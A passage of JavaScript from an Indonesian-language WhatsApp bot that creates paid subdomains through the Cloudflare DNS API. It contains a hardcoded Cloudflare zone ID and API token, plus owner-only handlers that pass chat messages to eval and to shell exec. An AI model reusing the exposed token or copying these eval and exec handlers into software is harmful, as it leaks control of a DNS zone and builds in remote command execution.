   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

      //=================================================//
      default:
        if (budy.startsWith("=>")) {
          if (!isCreator)
            return m.reply(
              `Maaf Command Tersebut Khusus Developer Bot WhatsApp`
            );
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return m.reply(bang);
          }
          try {
            m.reply(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            m.reply(String(e));
          }
        }
        if (budy.startsWith(">")) {
          if (!isCreator)
            return m.reply(
              `Maaf Command Tersebut Khusus Developer Bot WhatsApp`
            );
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await m.reply(evaled);
          } catch (err) {
            await m.reply(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!isCreator)
            throw `Maaf Command Tersebut Khusus Developer Bot WhatsApp`;
          exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(err);
            if (stdout) return m.reply(stdout);
          });
        }
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
